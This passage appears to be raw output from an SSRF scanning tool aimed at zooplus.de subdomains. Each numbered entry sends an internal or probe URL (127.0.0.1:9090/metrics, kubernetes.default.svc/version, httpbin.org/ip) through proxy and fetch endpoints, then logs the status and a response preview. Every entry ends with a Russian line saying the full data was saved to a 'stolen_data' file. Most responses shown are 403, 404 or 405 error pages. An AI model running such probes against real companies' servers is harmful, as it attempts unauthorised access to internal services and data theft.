+    [+] Полные данные сохранены: logs/stolen_data_6.txt
+
+[7] Subdomain: www.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_7.txt
+
+[8] Subdomain: www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_8.txt
+
+[9] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_9.txt
+
+[10] Subdomain: www.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_10.txt
+
+[11] Subdomain: www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_11.txt
+
+[12] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_12.txt
+
+[13] Subdomain: www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_13.txt
+
+[14] Subdomain: www.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_14.txt
+
+[15] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_15.txt
+
+[16] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_16.txt
+
+[17] Subdomain: www.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_17.txt
+
+[18] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_18.txt
+
+[19] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_19.txt
+
+[20] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_20.txt
+
+[21] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://kubernetes.default.svc/version
+    Status: 400
+    Length: 261954 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_21.txt
+
+[22] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://httpbin.org/ip
+    Status: 400
+    Length: 261954 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_22.txt
+
+[23] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://kubernetes.default.svc/version
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_23.txt
+
+[24] Subdomain: m.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_24.txt
+
+[25] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_25.txt
+
+[26] Subdomain: m.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_26.txt
+
+[27] Subdomain: m.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_27.txt
+
+[28] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://httpbin.org/ip
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_28.txt
+
+[29] Subdomain: m.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_29.txt
+
+[30] Subdomain: m.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_30.txt
+
+[31] Subdomain: m.zooplus.de
+    Endpoint: /api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_31.txt
+
+[32] Subdomain: m.zooplus.de
+    Endpoint: /api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_32.txt
+
+[33] Subdomain: m.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_33.txt
+
+[34] Subdomain: m.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_34.txt
+
+[35] Subdomain: m.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_35.txt
+
+[36] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_36.txt
+
+[37] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_37.txt
+
+[38] Subdomain: m.zooplus.de
+    Endpoint: /api/request
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_38.txt
+
+[39] Subdomain: www.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_39.txt
+
+[40] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_40.txt
+
+[41] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/fetch
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_41.txt
+
+[42] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
+<TITLE>ERROR: The request could not be satisfied</TITLE>
+</HEAD><BODY>
+<H1>403 ERROR</H1>
+<H2>The request could not be satisfied.</H2>
+<HR noshade size="1px">
+Request blocked.
+We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again
+    [+] Полные данные сохранены: logs/stolen_data_42.txt
+
+[43] Subdomain: m.zooplus.de
+    Endpoint: /api/image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_43.txt
+
+[44] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_44.txt
+
+[45] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://httpbin.org/ip
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_45.txt
+
+[46] Subdomain: m.zooplus.de
+    Endpoint: /image/proxy
+    Test URL: http://httpbin.org/ip
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_46.txt
+
+[47] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/recently-viewed
+    Test URL: http://kubernetes.default.svc/version
+    Status: 405
+    Length: 64 bytes
+    Server: istio-envoy
+    Preview: {"message": "The method is not allowed for the requested URL."}
+
+    [+] Полные данные сохранены: logs/stolen_data_47.txt
+
+[48] Subdomain: m.zooplus.de
+    Endpoint: /zootopia-events/api/proxy
+    Test URL: http://kubernetes.default.svc/version
+    Status: 404
+    Length: 261960 bytes
+    Server: AmazonS3
+    Preview: <!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta charset="utf-8"/>
+    <meta name="robots" content="noindex, follow"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-components/v6-latest/css/library-base.min.css"/>
+    <link rel="stylesheet"
+          href="https://cdn.public.zooplus.net/media/ui-compo
+    [+] Полные данные сохранены: logs/stolen_data_48.txt
+
+[49] Subdomain: t.zooplus.de
+    Endpoint: /zootopia-events/api/events/sites/1
+    Test URL: http://127.0.0.1:9090/metrics
+    Status: 403
+    Length: 919 bytes
+    Server: CloudFront
+    Preview: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
